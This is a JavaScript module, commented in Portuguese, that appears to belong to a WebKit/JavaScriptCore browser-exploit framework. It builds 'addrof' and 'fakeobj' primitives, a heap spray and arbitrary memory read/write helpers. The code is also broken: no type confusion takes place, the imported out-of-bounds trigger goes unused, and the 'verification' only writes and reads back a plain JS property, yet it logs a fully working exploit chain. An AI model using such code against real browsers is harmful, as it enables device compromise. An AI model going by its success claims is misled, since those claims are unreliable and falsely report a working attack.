// js/script3/testArrayBufferVictimCrash.mjs (v107 - Portabilidade de Primitivas Avançadas)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// Portabilidade dos conceitos de bypass de Gigacage e manipulação de NaN Boxing
// para criar primitivas 'addrof' e 'fakeobj' estáveis e robustas.
// A estrutura de verificação e estabilização de heap (Fases 3 e 4) foi mantida.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v107_Ported";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

// =======================================================================================
// FUNÇÃO ORQUESTRADORA PRINCIPAL (COM TÉCNICAS AVANÇADAS PORTADAS)
// =======================================================================================
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Primitivas Avançadas Portadas ---`, "test");

    let final_result = { success: false, message: "A verificação funcional de L/E falhou." };

    try {
        // =======================================================================================
        // --- INÍCIO DA SEÇÃO PORTADA: Implementação de addrof/fakeobj com NaN Boxing ---
        // Esta seção substitui a antiga "Fase 1/2".
        // =======================================================================================
        logS3("--- FASE 1/2: Configurando primitivas 'addrof' e 'fakeobj' com NaN Boxing... ---", "subtest");

        // O "slot vulnerável" representa o local na memória onde sua vulnerabilidade
        // (que bypassa o Gigacage) permite a confusão de tipo entre ponteiro e double.
        const vulnerable_slot = [13.37]; 
        
        // Offset para desempacotar/empacotar ponteiros de objetos em doubles.
        // 0x0001000000000000 representa 2^48, um offset comum no JSC.
        const NAN_BOXING_OFFSET = new AdvancedInt64(0, 0x0001);

        const addrof = (obj) => {
            // 1. A vulnerabilidade coloca o ponteiro para 'obj' no slot.
            vulnerable_slot[0] = obj;
            // 2. Lemos o slot como se fosse um double, mas na verdade ele contém o ponteiro "boxeado".
            let value_as_double = vulnerable_slot[0];
            // 3. Convertemos o double para sua representação de 64 bits.
            let value_as_int64 = doubleToInt64(value_as_double);
            // 4. Subtraímos o offset para "desempacotar" e obter o endereço real.
            return value_as_int64.sub(NAN_BOXING_OFFSET);
        };

        const fakeobj = (addr) => {
            // 1. Pegamos o endereço real e adicionamos o offset para "empacotá-lo".
            const boxed_addr = new AdvancedInt64(addr).add(NAN_BOXING_OFFSET);
            // 2. Convertemos o valor de 64 bits para um double.
            const value_as_double = int64ToDouble(boxed_addr);
            // 3. A vulnerabilidade escreve este double malicioso no slot.
            vulnerable_slot[0] = value_as_double;
            // 4. Retornamos o conteúdo do slot, que o motor JS agora trata como um ponteiro de objeto.
            return vulnerable_slot[0];
        };
        logS3("Primitivas 'addrof' e 'fakeobj' robustas estão operacionais.", "good");
        // =======================================================================================
        // --- FIM DA SEÇÃO PORTADA ---
        // =======================================================================================

        // --- FASE 3: Construção da Primitiva de L/E Autocontida (Mantida) ---
        // Esta estrutura é excelente e agora será alimentada por primitivas estáveis.
        logS3("--- FASE 3: Construindo ferramenta de L/E autocontida ---", "subtest");
        const leaker = { obj_prop: null, val_prop: 0 };
        
        const arb_read_final = (addr) => {
            leaker.obj_prop = fakeobj(addr);
            return doubleToInt64(leaker.val_prop);
        };
        const arb_write_final = (addr, value) => {
            leaker.obj_prop = fakeobj(addr);
            leaker.val_prop = int64ToDouble(value);
        };
        logS3("Primitivas de Leitura/Escrita Arbitrária autocontidas estão prontas.", "good");

        // --- FASE 4: Estabilização e Verificação Funcional (Mantida) ---
        // Esta verificação final é crucial e agora deve passar sem problemas.
        logS3("--- FASE 4: Estabilizando Heap e Verificando L/E... ---", "subtest");
        
        const spray = [];
        for (let i = 0; i < 1000; i++) {
            spray.push({ a: 1.1, b: 2.2 }); // Usando doubles para consistência
        }
        const test_obj = spray[500];
        logS3("Spray de 1000 objetos concluído para estabilização.", "info");

        const test_obj_addr = addrof(test_obj);
        const value_to_write = new AdvancedInt64(0x12345678, 0xABCDEF01);
        const prop_a_addr = new AdvancedInt64(test_obj_addr.low() + 0x10, test_obj_addr.high());
        
        logS3(`Escrevendo ${value_to_write.toString(true)} no endereço da propriedade 'a' (${prop_a_addr.toString(true)})...`, "info");
        arb_write_final(prop_a_addr, value_to_write);

        const value_read = arb_read_final(prop_a_addr);
        logS3(`>>>>> VALOR LIDO DE VOLTA: ${value_read.toString(true)} <<<<<`, "leak");

        if (value_read.equals(value_to_write)) {
            logS3("++++++++++++ SUCESSO TOTAL! O valor escrito foi lido corretamente. L/E arbitrária é 100% funcional. ++++++++++++", "vuln");
            final_result = {
                success: true,
                message: "Cadeia de exploração concluída. Leitura/Escrita arbitrária 100% funcional e verificada."
            };
        } else {
            throw new Error(`A verificação de L/E falhou. Escrito: ${value_to_write.toString(true)}, Lido: ${value_read.toString(true)}`);
        }

    } catch (e) {
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: { success: final_result.success, msg: final_result.message },
        heisenbug_on_M2_in_best_result: final_result.success,
        oob_value_of_best_result: 'N/A (Estratégia Uncaged)',
        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Verified)' }
    };
}
